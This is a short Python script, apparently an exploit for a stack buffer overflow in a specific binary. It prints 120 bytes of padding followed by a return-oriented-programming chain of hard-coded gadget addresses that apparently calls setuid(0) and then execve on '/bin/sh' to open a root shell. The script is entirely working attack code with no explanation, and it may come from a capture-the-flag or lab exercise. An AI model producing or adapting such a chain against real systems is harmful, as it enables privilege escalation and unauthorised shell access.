#!/usr/bin/env python3

import sys


sys.stdout.buffer.write(b'A'*120)
sys.stdout.buffer.write(0x0000000000456587.to_bytes(8, 'little'))
sys.stdout.buffer.write(int(105).to_bytes(8, 'little'))
sys.stdout.buffer.write(0x000000000040250f.to_bytes(8, 'little'))
sys.stdout.buffer.write(int(0).to_bytes(8, 'little'))
sys.stdout.buffer.write(0x000000000041b506.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x000000000048c0aa.to_bytes(8, 'little'))
sys.stdout.buffer.write(int(59).to_bytes(8, 'little'))
sys.stdout.buffer.write(int(0).to_bytes(8, 'little'))
sys.stdout.buffer.write(int(140737488349088).to_bytes(8, 'little'))
sys.stdout.buffer.write(0x000000000040a57e.to_bytes(8, 'little'))
sys.stdout.buffer.write(int(0).to_bytes(8, 'little'))
sys.stdout.buffer.write(0x000000000040250f.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x7ffffff68618.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x00000000004022c4.to_bytes(8, 'little'))
sys.stdout.buffer.write(b'/bin/sh\x00')


